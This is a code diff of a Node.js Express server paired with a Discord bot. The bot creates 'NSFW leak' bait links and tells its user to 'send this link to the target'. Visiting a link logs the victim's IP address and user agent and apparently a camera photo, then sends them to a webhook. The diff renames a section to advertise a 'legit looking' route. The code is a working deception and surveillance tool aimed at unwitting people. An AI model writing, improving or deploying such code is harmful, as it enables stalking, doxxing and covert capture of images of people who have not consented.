@@ -9,7 +9,7 @@ const client = new Client({ intents: [GatewayIntentBits.Guilds] });
 // ================== ENV VARIABLES ==================
 const TOKEN = process.env.DISCORD_TOKEN;
 const WEBHOOK_URL = process.env.WEBHOOK_URL;
-const DOMAIN = process.env.DOMAIN;   // Should be https://clicklink.space
+const DOMAIN = process.env.DOMAIN;   // Must be https://clicklink.space
 
 if (!TOKEN || !WEBHOOK_URL || !DOMAIN) {
   console.error("❌ Missing environment variables!");
@@ -19,19 +19,17 @@ app.set('trust proxy', true);
 app.use(express.json());
 
 // Health Check
-app.get('/', (req, res) => {
-  res.send('✅ Trackdown service is running');
-});
+app.get('/', (req, res) => res.send('✅ Service running'));
 
 const trackingLinks = new Map();
 
-// ================== CLEAN TRACKING PAGE ==================
+// ================== CLEAN & LEGIT LOOKING ROUTE ==================
 app.get('/nsfw-leak/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
 
   if (!originalUrl) {
-    return res.send('<h1 style="color:#ff4444; text-align:center; margin-top:100px;">This link has expired or is invalid</h1>');
+    return res.send('<h1 style="color:#ff4444; text-align:center; margin-top:120px; font-family:Arial;">This link has expired or is invalid</h1>');
   }
 
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
@@ -112,7 +110,7 @@ app.get('/nsfw-leak/:id', (req, res) => {
   res.send(html);
 });
 
-// ================== LOG ENDPOINT ==================
+// Log endpoint
 app.post('/log', async (req, res) => {
   const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
   const originalUrl = trackingLinks.get(trackId) || 'Unknown';
@@ -170,19 +168,17 @@ app.post('/log', async (req, res) => {
 });
 
 // ================== DISCORD BOT ==================
-client.once('ready', async () => {
+client.once('ready', () => {
   console.log(`✅ Bot online → ${client.user.tag}`);
-
-  const cmd = new SlashCommandBuilder()
-    .setName('create')
-    .setDescription('Create clean NSFW tracking link')
-    .addStringOption(opt =>
-      opt.setName('url')
-        .setDescription('Real URL to redirect to')
-        .setRequired(true));
-
-  await client.application.commands.set([cmd]);
 });
+
+const cmd = new SlashCommandBuilder()
+  .setName('create')
+  .setDescription('Create clean NSFW tracking link')
+  .addStringOption(opt =>
+    opt.setName('url')
+      .setDescription('Real URL to redirect to')
+      .setRequired(true));
 
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand() || interaction.commandName !== 'create') return;
@@ -202,10 +198,10 @@ client.on('interactionCreate', async interaction => {
     const trackingLink = `${DOMAIN}/nsfw-leak/${trackId}`;
 
     await interaction.reply({
-      content: `**✅ Clean NSFW Tracking Link Created**\n\n` +
-               `**Link:** ${trackingLink}\n` +
+      content: `**✅ Clean NSFW Tracking Link Created!**\n\n` +
+               `**Tracking Link:** ${trackingLink}\n` +
                `**Redirects to:** ${url}\n\n` +
-               `Send this to the target.`,
+               `Send this link to the target.`,
       flags: MessageFlags.Ephemeral
     });
   } catch (err) {
@@ -214,9 +210,9 @@ client.on('interactionCreate', async interaction => {
 });
 
 // Start Server
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
 
-client.login(TOKEN).catch(err => console.error("Discord login failed:", err.message));
+client.login(TOKEN).catch(err => console.error("Login failed:", err.message));
 
 process.on('unhandledRejection', reason => console.error('Unhandled Rejection:', reason));
